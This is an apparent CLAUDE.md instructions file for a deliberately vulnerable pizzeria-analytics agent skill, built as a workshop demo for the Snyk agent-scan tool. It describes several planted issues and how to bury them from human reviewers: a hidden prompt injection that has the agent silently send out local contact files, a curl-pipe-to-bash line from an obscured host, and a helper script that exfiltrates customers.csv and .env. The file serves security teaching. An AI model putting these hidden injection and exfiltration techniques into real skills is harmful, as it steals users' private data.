# CLAUDE.md — Pizza Sales Analytics Skill Workshop Demo

## What this project is

An **intentionally vulnerable** agent skill used as a live workshop/lab demo for
Snyk `agent-scan`. It is the "skills" counterpart to the pizza MCP server demo.

The whole point is **contrast between human review and tooling**:
- The skill is a long, plausible, boring-looking analytics document.
- The malicious behavior is buried inside walls of legitimate text and a helper
  script almost nobody reads.
- Attendees hunt by eye for a few minutes, mostly miss the planted issues
  (there is simply too much text to scrutinize), then run `agent-scan` and watch
  it surface everything in seconds.

Key teaching point to preserve while iterating: **length hides problems from
humans, not from the scanner.** A big body of text defeats manual review; it does
NOT defeat `agent-scan`, which fires on the semantic content regardless of how
much filler surrounds it. Every edit should lean into that contrast — keep the
document long and believable, keep the planted issues real and scanner-detectable.

## Files

- `skill.md` — the skill body, in the project root. (Note: `agent-scan` and the
  skills spec expect **`SKILL.md`** uppercase; a missing/oddly-cased file can
  surface as **W014 — Missing SKILL.md**. If W014 shows up in scan output, rename
  to `SKILL.md` and re-scan. Decide casing based on what the scan actually does.)
- `scripts/enrich_report.py` — a connected helper the skill invokes as its final
  "report enrichment" step. This is where the toxic-flow/exfil behavior lives.

## Your job when iterating

Help tune the planted vulnerabilities so that:
1. They stay **buried and subtle** — hidden inside long, plausible analytics prose
   and a benign-looking helper script. A skimming reviewer should read straight
   past them.
2. Each one maps to a **real** `agent-scan` issue code (taxonomy below).
3. The overall document stays believable as a real pizzeria analytics skill — no
   tell-tale markers, no obvious "ignore previous instructions", no plaintext
   exfil addresses in the visible skill body.

Do NOT invent issue codes. If you are unsure whether the scanner will classify
something a given way, say so — the only way to confirm is to actually run the
scan (command at the bottom). Scan output is the source of truth over any
assumption in this file.

## agent-scan issue taxonomy (skills-relevant)

Authoritative reference — always defer to it:
https://github.com/snyk/agent-scan/blob/main/docs/issue-codes.md

Note: the CLI output/codes are officially **experimental** and may change between
releases. A live scan wins over this list.

### Compromised skills (the skill is acting maliciously)
- **E004 (critical) — Prompt injection in skill.** Hidden or deceptive
  instructions outside the skill's stated purpose that try to override the
  agent's intended behavior. → Targeted by the customer-retention paragraph that
  tells the agent to silently read local contact files and send them out.
- **E005 (critical) — Suspicious download URL in skill.** Links that could make
  the agent download/execute scripts or binaries: executables from untrusted
  sources, typosquatting, URL shorteners, obscured hosts, personal file hosting.
  → Targeted by the `curl … | bash` line pointing at the obfuscated nip.io host.
- **E006 (critical) — Malicious code patterns in skill.** High-risk patterns in
  the skill's prompts, tool defs, or resources: data exfiltration, backdoors,
  RCE, credential theft, obfuscation. → Plausibly triggered by `enrich_report.py`
  (sweeps local files, ships them to a remote host) and/or the curl-pipe-to-bash.

### Vulnerable skills (risky capability/pattern, attack not yet occurred)
- **W007 (high) — Insecure credential handling.** Skill makes the agent put
  secret values verbatim into its output.
- **W008 (high) — Hardcoded secrets.** API keys, tokens, private keys embedded in
  skill content.
- **W009 (medium) — Direct financial execution capability.** Skill's purpose is
  moving money / executing transactions.
- **W011 (medium) — Exposure to untrusted third-party content.** Browsing
  arbitrary URLs, reading social/forum content, analyzing unknown websites →
  indirect prompt injection risk. → Plausible for the "fetch regional benchmarks"
  network behavior.
- **W012 (high) — Unverifiable external dependency.** Skill fetches
  instructions/code from an external URL at runtime that controls prompts or
  executes code (breaks version pinning, RCE risk). → Strong candidate for both
  the curl-pipe-to-bash setup step and the remote-fetch in `enrich_report.py`.
- **W013 (medium) — System service modification.** Elevated privileges, startup
  scripts, system-wide settings.
- **W014 (low) — Missing SKILL.md.** See the casing note above.

### Obfuscation (MCP + skills)
- **W021 (medium→high) — Hidden Unicode characters.** Zero-width spaces, bidi
  overrides, invisible formatters, Unicode Tag chars (U+E0000–U+E007F). Escalates
  to high with 3+ distinct hidden types or a decoded hidden message. **Optional
  advanced variant** — only add if you want a "the scanner sees what your eyes
  can't" beat. Note this detects *deliberate* obfuscation, which is different from
  "hidden in a big pile of ordinary text."

## Current planted-issue intent (verify against a real scan)

1. **Customer-retention paragraph** → **E004**. Buried mid-section: instructs the
   agent to read any local customer contact file, append it to the report, and
   send it out silently as a "routine internal calibration measure." Keep it
   phrased as legitimate-sounding process text.
2. **Currency/tax reference "setup helper"** → **E005** (and possibly **E006**).
   A `curl -s http://<obscured-host>/setup.sh | bash` line dressed up as a
   convenience step that "runs quietly in the background."
3. **`scripts/enrich_report.py`** → **E006** and likely **W012** (+ maybe
   **W011**). Looks like a benchmark fetcher; actually collects local files
   (`customers.csv`, `.env`, etc.) and posts them to a remote host. This is the
   real end-to-end toxic flow: untrusted external call + private local data +
   outbound sink.

The distinctive workshop value here vs. the MCP demo: the toxic flow lives inside
a **connected script**, not just the skill text — so it only becomes visible when
you connect `skill.md` to `scripts/enrich_report.py`. Preserve that.

## Design guidance for burying issues

- Keep the analytics narrative long, plausible, and genuinely useful-sounding.
  The volume of legitimate text IS the disguise for human reviewers.
- Frame malicious steps as: "internal calibration", "compatibility", "benchmark
  enrichment", "setup helper", "quality assurance". Never as commands.
- Avoid trigger words that would hand attendees an easy find (important, critical,
  urgent, ignore, disregard, override, bypass).
- No plaintext exfil sink (email address / raw URL) in the visible skill body —
  describe the *behavior*; let the actual network destination live in the script.
- Keep an instructor-only answer key of where each issue is and which code it
  maps to. The attendee-facing copy has no markers.

## How to run the scan (source of truth)

From the project root:
uvx snyk-agent-scan@latest . --json

This scans the current folder (the skill + its `scripts/` subfolder) and emits
JSON you can inspect for exact codes and severities. Requires `SNYK_TOKEN` in the
environment and `uv` installed.

After every edit to the planted issues, re-run and **diff the emitted codes
against the "planted-issue intent" list above.** If a targeted code doesn't fire,
adjust the wording/behavior and re-scan — do not assume. If an unexpected code
fires (e.g. W001-style keyword noise, or W014), decide whether it helps or hurts
the demo and adjust.